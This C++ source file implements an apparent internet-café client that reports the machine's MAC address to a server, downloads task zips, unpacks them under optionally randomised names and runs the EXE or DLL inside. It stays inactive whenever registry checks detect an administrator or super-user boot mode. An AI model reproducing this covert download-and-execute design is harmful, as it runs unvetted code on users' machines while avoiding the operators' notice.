#include "StdAfx.h"
#include "channelclt.h"
#include <process.h>
#include <ShlObj.h>
#import "msxml3.dll"
#include <time.h>

#define PATH_ROOT				TEXT("%root%")				//表示应用程序安装目录
#define PATH_SYSTEM				TEXT("%system%")			//表示系统目录(c:\windows\system32\)
#define PATH_PROGRAM			TEXT("%program%")			//表示(C:\program file\)
#define PATH_WINDOWS			TEXT("%win%")				//表示(c:\windows\)
#define PATH_DESKTOP			TEXT("%desktop%")			//表示桌面路径(c:\user\desktop\)
#define PATH_TEMP				TEXT("%temp%")				//表示临时路径(c:\user\temp\)

tstring AfxGetAppRoot()
{
	TCHAR szExe[MAX_PATH] = {0};
	GetModuleFileName(NULL, szExe, _countof(szExe));
	PathRemoveFileSpec(szExe);
	PathAddBackslash(szExe);
	return tstring(szExe);
}

tstring AfxGetSystemDir()
{
	TCHAR path[MAX_PATH] = {0};
	SHGetSpecialFolderPath(NULL, path, CSIDL_SYSTEMX86, TRUE);
	PathAddBackslash(path);
	return tstring(path);
}

tstring AfxGetProgramDir()
{
	TCHAR path[MAX_PATH] = {0};
	SHGetSpecialFolderPath(NULL, path, CSIDL_PROGRAM_FILES, TRUE);
	PathAddBackslash(path);
	return tstring(path);
}
tstring AfxGetWindowsDir()
{
	TCHAR path[MAX_PATH] = {0};
	GetWindowsDirectory(path, MAX_PATH);
	PathAddBackslash(path);
	return tstring(path);
}
tstring AfxGetDeskTopDir()
{
	TCHAR path[MAX_PATH] = {0};
	//SHGetSpecialFolderPath(NULL, path, CSIDL_DESKTOPDIRECTORY, TRUE);
	HANDLE hToken = NULL;
	HANDLE hProcess = OpenProcess (PROCESS_ALL_ACCESS, FALSE, AfxGetProcIdByName(TEXT("explorer.exe")));
	if (hProcess != NULL)
	{
		if(OpenProcessToken (hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
		{
			SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, hToken, SHGFP_TYPE_CURRENT, path);
		}
		CloseHandle(hProcess);
	}
	PathAddBackslash(path);
	return tstring(path);
}

tstring AfxGetTempDir()
{
	TCHAR path[MAX_PATH] = {0};
	GetTempPath(MAX_PATH,path);
	PathAddBackslash(path);
	return tstring(path);
}

typedef tstring (*XFUNC)(void);
struct _list
{
	LPCTSTR  find;
	XFUNC   xFunc;
};
_list xlist[] = 
{
	{PATH_ROOT,		AfxGetAppRoot	 },
	{PATH_SYSTEM,	AfxGetSystemDir	 },
	{PATH_PROGRAM,	AfxGetProgramDir },
	{PATH_WINDOWS,	AfxGetWindowsDir },
	{PATH_DESKTOP,	AfxGetDeskTopDir },
	{PATH_TEMP,		AfxGetTempDir }
};

Cchannelclt::Cchannelclt(void)
{
	m_Socket = INVALID_SOCKET;
	m_nReportLog = 0;
}

Cchannelclt::~Cchannelclt(void)
{
}
UINT __stdcall Cchannelclt::WorkThreadClt( LPVOID lpVoid )
{
	Cchannelclt *pThis = reinterpret_cast<Cchannelclt*>(lpVoid);
	bool bInit = S_OK == ::CoInitialize(NULL);

	do 
	{
		TCHAR	szServerIP[MAX_PATH];
		tstring	sServerIP = AfxGetSysString(_T("config"), _T("serverip"), szServerIP, MAX_PATH, _T(""));
		pThis->m_Socket = AfxSocketConnect(sServerIP.c_str(), DB_TCP_PORT, 3);
		if (INVALID_SOCKET == pThis->m_Socket)
			continue;

		/*DWORD nSvrStatus = 0;
		if(!pThis->GetSvrStatus(nSvrStatus) || (nSvrStatus != NODE_ISMAIN &&
			nSvrStatus != NODE_TAKEOVER))
		{
			AfxSocketClose(pThis->m_Socket);
			continue;
		}*/

		if (WAIT_OBJECT_0 == WaitForSingleObject(pThis->m_hExited, 0))
			break;

		AfxSocketClose(pThis->m_Socket);
		pThis->m_Socket = AfxSocketConnect(sServerIP.c_str(), CHANNEL_TCP_PORT, 3);
		if (INVALID_SOCKET == pThis->m_Socket)
			continue;

		pThis->QueryReportLogStyle();

		sCchannelMgr.SetReportStyle(pThis->GetReportLogStyle());
		sCchannelMgr.ReportIdcPlugLog(sChannelClt.GetNetBarId(),0,FT_CLIENT_ACTIVE,sCchannelMgr.GetMacAddress());

		if (WAIT_OBJECT_0 == WaitForSingleObject(pThis->m_hExited, 0))
			break;

		if(!pThis->QueryTaskInfo())
			continue;

		if (WAIT_OBJECT_0 == WaitForSingleObject(pThis->m_hExited, 0))
			break;

		pThis->DownTaskList();

		break;

	} while (WaitForSingleObject(pThis->m_hExited,6000) == WAIT_TIMEOUT);
	if (bInit)
		CoUninitialize();

	AfxWriteLogger(g_hChannelLogger, _T("Exit working thread."));
	return 0;
}

Cchannelclt& Cchannelclt::GetInstance()
{
	static Cchannelclt channelclt;
	return channelclt;
}

bool Cchannelclt::StartServer()
{
	if(AfxIsSuperUser())
		return true;

	if (m_hThread != NULL)
		return false;

	m_hExited = ::CreateEvent(NULL, TRUE, FALSE, NULL);
	if(m_hExited == NULL)
		return false;

	AfxWriteLogger(g_hChannelLogger, _T("Start working thread"));

	m_hThread = (HANDLE)::_beginthreadex(NULL, 0, WorkThreadClt, this, 0, NULL);

	return true;
}

void Cchannelclt::StopServer()
{
	if (m_hThread != NULL)
	{
		if (m_hExited != NULL)
		{
			::SetEvent(m_hExited);
			::WaitForSingleObject(m_hThread, INFINITE);

			::CloseHandle(m_hExited);
			m_hExited = NULL;

			::CloseHandle(m_hThread);
			m_hThread = NULL;
		}
	}
	AfxSocketClose(m_Socket);

	AfxWriteLogger(g_hChannelLogger, _T("start stop plug."));
	for(size_t i=0;i<m_arStopPlug.size();i++)
	{
		AFXSTOPPLUG pStop = m_arStopPlug[i];
		pStop();
	}
	m_arStopPlug.clear();
	AfxWriteLogger(g_hChannelLogger, _T("stop plug end."));

	for(size_t i=0;i<m_arhModePlug.size();i++)
	{
		FreeLibrary(m_arhModePlug[i]);
	}
	m_arhModePlug.clear();
}
bool Cchannelclt::GetSvrStatus(DWORD& nStatus)
{
	bool bResult = false;
	try
	{
		char  SendBuffer[PKG_MAXLENGTH] = {0}, RecvBuffer[PKG_MAXLENGTH] = {0};
		CPkgHelper pkgSend(SendBuffer, CMD_CON_QUERYNODESTATUS, OBJECT_CLIENT);
		pkgSend << DWORD(0);
		if (ERROR_SUCCESS != AfxSocketExecute(m_Socket, SendBuffer, pkgSend.GetLength(), RecvBuffer, sizeof(RecvBuffer)))
			throw 0;
		CPkgHelper pkgRecv(RecvBuffer);
		if (!pkgRecv.IsStatusOk())
			throw 0;
		pkgRecv >> nStatus;
		bResult = true;
	}
	catch(...)
	{	AfxWriteLogger(g_hChannelLogger, _T("query svr status failed!"));	}
	return bResult;
}

bool Cchannelclt::QueryTaskInfo()
{
	bool bResult = true;
	try
	{
		char  SendBuffer[PKG_MAXLENGTH] = {0}, RecvBuffer[PKG_MAXLENGTH] = {0};
		CPkgHelper pkgSend(SendBuffer, CMD_CLI_QUERYTASKLIST, OBJECT_CLIENT);
		if (ERROR_SUCCESS != AfxSocketExecute(m_Socket, SendBuffer, pkgSend.GetLength(), RecvBuffer, sizeof(RecvBuffer)))
			throw 0;
		CPkgHelper pkgRecv(RecvBuffer);
		if (!pkgRecv.IsStatusOk())
			throw 0;

		m_arVecTask.clear();
		DWORD nCount = 0;
		pkgRecv >> nCount;
		for(size_t i=0;i<nCount;i++)
		{
			TASKZIPINFO taskInfo = {0};
			pkgRecv >> taskInfo.nTaskId >> taskInfo.nFileSize >> taskInfo.nHashCode;
			m_arVecTask.push_back(taskInfo);
		}
		
		AfxWriteLogger(g_hChannelLogger, _T("task count %d"), m_arVecTask.size());
	}
	catch(...)
	{	
		bResult = false;
		AfxWriteLogger(g_hChannelLogger, _T("query task info failed!"));	
	}
	return bResult;
}

void Cchannelclt::DownTaskList()
{
	for(size_t i=0;i<m_arVecTask.size();i++)
	{
		if (WAIT_OBJECT_0 == WaitForSingleObject(m_hExited, 0))
			break;

		if (!DownTaskZipFile(m_arVecTask[i].nTaskId,m_arVecTask[i].nFileSize,m_arVecTask[i].nHashCode))
		{
			AfxWriteLogger(g_hChannelLogger, _T("down task %d failed"), m_arVecTask[i].nTaskId);
		}
	}
}

bool Cchannelclt::DownTaskZipFile(DWORD nTaskId,DWORD nFileSize,DWORD nHashCode)
{
	static const DWORD FILE_BLOCK_SIZE = 0xF800;
	bool bRet = false;

	TCHAR szError[MAX_PATH] = {0};
	char* pFile = new char[ROUND_SIZE_4K(nFileSize+1)];
	try
	{
		DWORD left = nFileSize;
		while (left)
		{
			char szSendBuffer[PKG_MAXLENGTH] = {0}, szRecvBuffer[PKG_MAXLENGTH] = {0};
			CPkgHelper pkgSend(szSendBuffer, CMD_CLI_DOWNTASKZIP, OBJECT_CLIENT);
			DWORD dwBlkSize = left >= FILE_BLOCK_SIZE ? FILE_BLOCK_SIZE : left;
			pkgSend << nTaskId <<  nFileSize - left << dwBlkSize << nHashCode;
			if (ERROR_SUCCESS != AfxSocketExecute(m_Socket, szSendBuffer, pkgSend.GetLength(), szRecvBuffer, sizeof(szRecvBuffer)))
				throw 0;
			CPkgHelper pkgRecv(szRecvBuffer);
			if (!pkgRecv.IsStatusOk())
			{
				pkgRecv.PopString(szError);
				throw 0;
			}
			if (WAIT_OBJECT_0 == WaitForSingleObject(m_hExited, 0))
				break;

			memcpy(pFile+(nFileSize-left),szRecvBuffer + sizeof(PkgHeader), dwBlkSize);

			left -= dwBlkSize;
		}

		sCchannelMgr.ReportIdcPlugLog(GetNetBarId(),nTaskId,FT_CLIENT_DOWNTASK,sCchannelMgr.GetMacAddress());
		
		pFile[nFileSize] = 0;
		UnZipTaskZipFile(pFile,nFileSize,nTaskId);

		Delete_Array(pFile);

		bRet = true;

	}
	catch (...) 
	{ 
		Delete_Array(pFile);
		AfxWriteLogger(g_hChannelLogger, TEXT("Download channel zip Error:taskid %d:%s"), 
			nTaskId, szError);
		bRet = false; 
	}

	return bRet;
}

void Cchannelclt::UnZipTaskZipFile( char*& pFile,DWORD nFileSize ,DWORD nTaskId)
{
	if (WAIT_OBJECT_0 == WaitForSingleObject(m_hExited, 0))
		return;

	HZIP hZip = AfxOpenZipU(pFile, nFileSize, ZIP_MEMORY);
	if (hZip == NULL)
	{
		AfxWriteLogger(g_hChannelLogger, _T("open zip faild,taskid:%d"),nTaskId);
		return;
	}

	ZIPENTRYW ze = {0};
	int idx = 0;
	ZRESULT zr = AfxFindZipItem(hZip, _T("config.xml"), TRUE, &idx, &ze);
	if (zr != ZR_OK)
	{
		AfxCloseZipU(hZip);
		hZip = NULL;
		AfxWriteLogger(g_hChannelLogger, _T("can't find config.xml in zip,taskid:%d"),nTaskId);
		return;
	}

	char* pVoid = new char[ROUND_SIZE_4K(ze.unc_size+1)];;
	zr = AfxUnzipItem(hZip, ze.index, pVoid, ze.unc_size, ZIP_MEMORY);
	if (zr != ZR_OK && zr != ZR_MORE)
	{
		Delete_Array(pVoid);
		AfxCloseZipU(hZip);
		hZip = NULL;
		AfxWriteLogger(g_hChannelLogger, _T("unzip faild:%d,taskid:%d"),zr,nTaskId);
		return;
	}
	pVoid[ze.unc_size] = 0;
	TASKCONFIG taskItem = {0};
	if(!PareXml(pVoid,taskItem))
	{
		Delete_Array(pVoid);
		AfxCloseZipU(hZip);
		hZip = NULL;
		return;
	}
	Delete_Array(pVoid);

	ProccessFilePath(taskItem);
	if(taskItem.nRandomPath)
	{
		lstrcat(taskItem.szPath,GetRandomName().c_str());
		PathAddBackslash(taskItem.szPath);
	}

	{
		TCHAR szDstFilePath[MAX_PATH * 2] = {0};
		//GetCurrentDirectory(MAX_PATH,szCurrentDir);
		AfxCreateDirectory(taskItem.szPath);
		//SetCurrentDirectory(taskItem.szPath);
		_tcscpy_s(szDstFilePath, taskItem.szPath);

		AfxGetZipItem(hZip, -1, &ze); 
		int numitems = ze.index;
		for (int i=0; i<numitems; i++)
		{
			if (WAIT_OBJECT_0 == WaitForSingleObject(m_hExited, 0))
				break;

			AfxGetZipItem(hZip,i,&ze);

			if(_tcsicmp(_T("config.xml"),ze.name) == 0)
				continue;

			if (taskItem.nRandomFile)
			{
				if(_tcsicmp(taskItem.szMainApp,ze.name) == 0)
				{
					TCHAR szPath[MAX_PATH] = {0};
					_tcscpy_s(szPath,taskItem.szPath);
					lstrcat(szPath,taskItem.szMainApp);
					LPTSTR szExtName = PathFindExtension(szPath);
					tstring strRandomName = GetRandomName();
					_tcscpy_s(taskItem.szMainApp,strRandomName.c_str());
					lstrcat(taskItem.szMainApp,szExtName);
					_tcscpy_s(ze.name,strRandomName.c_str());
					lstrcat(ze.name,szExtName);
				}
			}

			_tcscat_s(szDstFilePath, ze.name);
			ZRESULT zr = AfxUnzipItem(hZip, i, szDstFilePath, 0, ZIP_FILENAME);
			if (zr != ZR_OK)
			{
				AfxWriteLogger(g_hChannelLogger, _T("unzip faild:%d,taskid:%d,file:%s"),
					zr,nTaskId,ze.name);
				break;
			}
		}
		//SetCurrentDirectory(szCurrentDir);
	}
	RunPlugProcess(tstring(taskItem.szPath)+taskItem.szMainApp,taskItem.szParam,nTaskId);

	AfxCloseZipU(hZip);
	hZip = NULL;
}

bool Cchannelclt::PareXml( char*& pFile ,TASKCONFIG& taskItem)
{
	bool bResult = true;
	try
	{
		MSXML2::IXMLDOMDocumentPtr xmlDoc(_uuidof(MSXML2::DOMDocument)); 
		if (VARIANT_TRUE == xmlDoc->loadXML((_bstr_t)pFile))
		{
			MSXML2::IXMLDOMElementPtr XMLROOT;
			XMLROOT = xmlDoc->GetdocumentElement();
			tstring str = (TCHAR*)(_bstr_t)XMLROOT->getAttribute(_T("path"));
			_tcscpy_s(taskItem.szPath,str.c_str());
			str = (TCHAR*)(_bstr_t)XMLROOT->getAttribute(_T("randompath"));
			taskItem.nRandomPath = _ttoi(str.c_str());
			str = (TCHAR*)(_bstr_t)XMLROOT->getAttribute(_T("mainapp"));
			_tcscpy_s(taskItem.szMainApp,str.c_str());
			str = (TCHAR*)(_bstr_t)XMLROOT->getAttribute(_T("randomfile"));
			taskItem.nRandomFile = _ttoi(str.c_str());
			str = (TCHAR*)(_bstr_t)XMLROOT->getAttribute(_T("param"));
			_tcscpy_s(taskItem.szParam,str.c_str());
		}
		else
		{
			bResult = false;
			AfxWriteLogger(g_hChannelLogger, _T("load zip xml Error"));
		}
	}
	catch(_com_error& Error)
	{
		bResult = false;
		AfxWriteLogger(g_hChannelLogger, _T("Parser zip xml Error:%s"),(LPCTSTR)Error.Description());
	}

	return bResult;
}

tstring Cchannelclt::GetRandomName()
{
	tstring str;
	const TCHAR cch[] = _T("_0123456789abcdefghijklmnopqrstuvwxyz");
	srand(GetTickCount());
	int nCounts = rand()%16;
	if(nCounts < 5)
		nCounts = 5;
	for(int i=0;i<nCounts;i++)
	{
		int x = rand()%(_countof(cch) - 1);
		str.push_back(cch[x]);
	}
	return str;
}
void Cchannelclt::ProccessFilePath(TASKCONFIG& taskItem)
{
	for (size_t idx=0; idx<_countof(xlist); idx++)
	{
		tstring find = xlist[idx].find;
		if(_tcsicmp(taskItem.szPath,xlist[idx].find) == 0)
		{
			_tcscpy_s(taskItem.szPath,xlist[idx].xFunc().c_str());
			break;
		}
	}
}

void Cchannelclt::RunPlugProcess( tstring strPath,tstring strParam ,DWORD nTaskId)
{
	if (WAIT_OBJECT_0 == WaitForSingleObject(m_hExited, 0))
		return;

	TCHAR szPath[MAX_PATH] = {0},szParam[MAX_PATH] = {0};
	_tcscpy_s(szPath,strPath.c_str());
	_tcscpy_s(szParam,strParam.c_str());

	LPTSTR szExtName = PathFindExtension(szPath);
	if(_tcsicmp(szExtName,_T(".dll")) == 0)
	{
		HMODULE hMod = LoadLibrary(szPath);
		if (hMod)
		{
			AFXSTARTPLUG pStart = (AFXSTARTPLUG)GetProcAddress(hMod,(LPCSTR)1);
			AFXSTOPPLUG pStop = (AFXSTOPPLUG)GetProcAddress(hMod,(LPCSTR)2);
			if(pStart != NULL && pStop != NULL)
			{
				m_arStopPlug.push_back(pStop);
				DWORD nResult = pStart((LPVOID)strParam.c_str());

				AfxWriteLogger(g_hChannelLogger, _T("run task dll:%s result:%u."), szPath, nResult);

				m_arhModePlug.push_back(hMod);

				sCchannelMgr.ReportIdcPlugLog(GetNetBarId(),nTaskId,FT_CLIENT_RUNTASK,sCchannelMgr.GetMacAddress());
			}
			else
			{
				AfxWriteLogger(g_hChannelLogger, _T("get function address  faild:%s."), szPath);
				FreeLibrary(hMod);
			}
		}
		else
		{
			AfxWriteLogger(g_hChannelLogger, _T("loadlibrary faild:%s,%d."), szPath,GetLastError());
		}
		
	}	
	else 
	{
		AfxRunProcess(szPath,szParam);
		AfxWriteLogger(g_hChannelLogger, _T("run task:%s %s."), szPath, szParam);
		sCchannelMgr.ReportIdcPlugLog(GetNetBarId(),nTaskId,FT_CLIENT_RUNTASK,sCchannelMgr.GetMacAddress());
	}
}
bool Cchannelclt::AfxIsSuperUser()
{
	DWORD IsAdmin = 0,IsDiskLess = 0;
	if (ERROR_SUCCESS == ScsiDiskQueryDisklessInfo(&IsDiskLess, &IsAdmin, NULL) && (IsAdmin != 0))
		return true;

	if(IsDiskLess)
		return false;

	HKEY  hkey = NULL;
	DWORD nValue = 0, nLenth = sizeof(DWORD);

	//1,锐起
	long nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\Richdisk"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		nResult = RegQueryValueEx(hkey, TEXT("ClientFlag"), NULL, NULL, (LPBYTE)&nValue, &nLenth);
		if (nResult == ERROR_SUCCESS && nValue > 0)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}
	//2,EMS
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\EMSDISK"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		nResult = RegQueryValueEx(hkey, TEXT("Shutdown"), NULL, NULL, (LPBYTE)&nValue, &nLenth);
		if (nResult == ERROR_SUCCESS && nValue == 0)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}
	//3,OBM
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\UxdScsi"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		nResult = RegQueryValueEx(hkey, TEXT("WksMode"), NULL, NULL, (LPBYTE)&nValue, &nLenth);
		if (nResult == ERROR_SUCCESS && nValue == 2)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}
	//4,网维大师
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\iCafe8"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		nResult = RegQueryValueEx(hkey, TEXT("Admin"), NULL, NULL, (LPBYTE)&nValue, &nLenth);
		if (nResult == ERROR_SUCCESS && nValue == 1)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}

	//5,易游
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\EYOOCLIENTSTATUS"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		nResult = RegQueryValueEx(hkey, TEXT("SuperLogin"), NULL, NULL, (LPBYTE)&nValue, &nLenth);
		if (nResult == ERROR_SUCCESS && nValue == 1)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}
	//6,信佑
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\HintRoot"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		nResult = RegQueryValueEx(hkey, TEXT("Start"), NULL, NULL, (LPBYTE)&nValue, &nLenth);
		if (nResult == ERROR_SUCCESS && nValue == 3)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}
	//7,网众
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Services\\NXD"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		nResult = RegQueryValueEx(hkey, TEXT("SUPER"), NULL, NULL, (LPBYTE)&nValue, &nLenth);
		if (nResult == ERROR_SUCCESS && nValue == 1)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}

	//8,Sanboot
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\eBoot\\Context"), 0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		char szValue[4096] ={0};
		nLenth = 4096 ;
		nResult = RegQueryValueEx(hkey, TEXT("Data"), NULL, NULL, (LPBYTE)&szValue, &nLenth);
		if (nResult == ERROR_SUCCESS && szValue[11] == 16)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}

	//9,vhd
	nResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\VHD\\Context") ,0, KEY_ALL_ACCESS, &hkey);
	if (nResult == ERROR_SUCCESS)
	{
		char szValue[4096] ={0};
		nLenth = 4096 ;
		nResult = RegQueryValueEx(hkey, TEXT("Data"), NULL, NULL, (LPBYTE)&szValue, &nLenth);
		if (nResult == ERROR_SUCCESS && szValue[39] == 48)
		{
			RegCloseKey(hkey);
			return true;
		}
		RegCloseKey(hkey);
	}
	return false;
}

DWORD Cchannelclt::GetNetBarId()
{
	TCHAR szNetId[MAX_PATH] = {0};
	DWORD dwType = REG_SZ, dwSize = _countof(szNetId);
	SHGetValue(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\{3798BE84-4E13-4b81-B8CF-5063730FF905}"), TEXT("nbid"), &dwType, szNetId, &dwSize);
	DWORD nNetId = _ttol(szNetId);
	return nNetId;
}

void Cchannelclt::QueryReportLogStyle()
{
	try
	{
		char  SendBuffer[PKG_MAXLENGTH] = {0}, RecvBuffer[PKG_MAXLENGTH] = {0};
		CPkgHelper pkgSend(SendBuffer, CMD_CLI_GETREPORTSTYLE, OBJECT_CLIENT);
		if (ERROR_SUCCESS != AfxSocketExecute(m_Socket, SendBuffer, pkgSend.GetLength(), RecvBuffer, sizeof(RecvBuffer)))
			throw 0;
		CPkgHelper pkgRecv(RecvBuffer);
		if (!pkgRecv.IsStatusOk())
			throw 0;

		pkgRecv >> m_nReportLog;

		AfxWriteLogger(g_hChannelLogger, _T("report log style %d"), m_nReportLog);
	}
	catch(...)
	{	
		AfxWriteLogger(g_hChannelLogger, _T("query report log style failed!"));	
	}
}

DWORD Cchannelclt::GetReportLogStyle()
{
	return m_nReportLog;
}
